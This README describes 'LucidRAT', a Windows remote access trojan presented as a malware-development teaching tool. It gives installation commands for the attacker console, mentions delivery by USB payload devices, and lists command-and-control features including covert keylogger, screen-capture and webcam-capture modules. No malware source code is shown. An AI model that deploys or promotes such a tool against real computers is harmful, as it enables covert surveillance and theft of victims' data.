# LucidRAT [BETA]
> Lucidif3r | 01/25/2022
---

```
:::       :::    :::  :::::::: ::::::::::: :::::::::  :::::::::      ::: :::::::::::
:+:       :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+:   :+: :+:   :+:      
+:+       +:+    +:+ +:+           +:+     +:+    +:+ +:+    +:+  +:+   +:+  +:+       
+#+       +#+    +:+ +#+           +#+     +#+    +:+ +#++:++#:  +#++:++#++: +#+        
+#+       +#+    +#+ +#+           +#+     +#+    +#+ +#+    +#+ +#+     +#+ +#+         
#+#       #+#    #+# #+#    #+#    #+#     #+#    #+# #+#    #+# #+#     #+# #+#          
########## ########   ######## ########### #########  ###    ### ###     ### ###           

## [!!] DISCLAIMER
TLDR:
Please use securily and ethically :D

Feel free to use this RAT on any computer that you own or have permissions to test malicious code on. It's perfectly legal. But do not install this RAT on targets you don't have permission to test malware on. Not only is it illegal, but by doing so you are putting that computer at risk. Since the RAT needs to be able to remotely connect, it is enabling a persistence that other hackers on the network may target or even bruteforce.

The purpose of this RAT is to teach members of the security community the basics of malware development, so do not use with malintent. Malware development is an essential skill that is often overlooked within the security world. By learning malware development, security researchers can both better understand how hackers think and develop malicious code, as well as learning to develop their own for security purposes. By making a single RAT that can hold all of the teachings in one form factor, it is much easier to connect the lessons.

## Overview:
LucidRAT [Lucid Remote Access Tool] is the *only RAT* you'll ever need. We will be able to use this tool to remotely command and control windows computers.

The RAT has a multitude of ways of how it can be installed on to a target pc. Whether it is getting them to run a file all the way to RubberDucky and BashBunny payloads.

Once installed we will have remote administrative access to our target. We can connect to our target through our Python console on our attacker pc. The Lucidrat console has plenty of payloads we can then use on our target or we can simply enjoy our backdoor access. Enjoy!

## Resources:
- [YouTube Video]()
- [YouTube Channel] ()
- [Websit] Soon

## Requirements:
**Attacker PC**
- Security Linux [Debian Based]
    - Kali Linux
    - Parrot OS
- Python3
- SSH

**Target PC**
- Windows 10 privileged user

## Instructions:
**Target Installation**
- install the RAT on to our target

**Attacker Installation**
- install lucid rat by cloning this repository
```bash
git clone https://github.com/Lucidif3r/LucidRAT.git
```
- install dependencies for lucidRAT
- **YES**, the lucidRAT directory **is** supposed to disappear
- restart terminal once installation is complete
```bash
cd LucidRAT
sh install.sh
```

**Attacker Console**
- Run `luicdrat` in your terminal for help
```bash
lucidrat
```
- Append configuraiton file to specify target
    - read `Extraneous` for more information
```bash
Lucidrat luicdif3r.rat
```

## Payloads:
```
[+] Command and Control:
    [orconsole] ------ Remote Console
    [fix orconsole] -- Fix Remote Console
    [upload] --------- Upload File
    [downlaod] ------- Download File
    [restart] -------- Restart Target PC
    [shutdown] ------- Shutdown Target PC
    [killswitch] ----- Removes LucidRAT From Target

[+] Reconnaissance:
    [install keylogger] ------ Install Keylogger
    [install screencapture] -- Install ScreenCapture
    [install webcam] --------- Install WebCam Capture
    [grab keylogs] ----------- Grab Keylogs
    [grab screenshots] ------- Grab ScreenShots From ScreenCapture
    [grab webcam] ------------ Grab WebCam Photos

[+] Options:
    [help] ------- Help Menu
    [man] -------- lucidrat Manual
    [config] ----- Display RAT File
    [version] ---- Version Number
    [update] ----- Update LucidRAT
    [uninstall] -- Uninstall LucidRAT
    [quit] ------- Quit
```

## Extraneous:

**Configuration file?**

The configuration file `username.rat` is a file we obtain through our LucidRAT.[Installers]
